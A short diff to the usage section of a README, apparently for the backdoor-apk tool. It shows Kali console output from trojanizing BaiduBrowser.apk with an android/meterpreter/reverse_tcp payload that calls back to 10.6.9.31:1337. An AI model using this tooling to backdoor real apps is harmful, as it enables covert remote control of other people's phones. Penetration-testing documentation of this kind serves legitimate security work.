@@ -5,7 +5,8 @@ Usage:
 
 ```
 root@kali:~/Android/evol-lab/BaiduBrowserRat# ./backdoor-apk.sh BaiduBrowser.apk 
-[*] Generating android/meterpreter/reverse_tcp payload...done.
+[*] Generating RAT APK file...done.
+[+] Using payload: android/meterpreter/reverse_tcp
 [+] Handle the reverse connection at: 10.6.9.31:1337
 [*] Decompiling RAT APK file...done.
 [*] Decompiling original APK file...done.
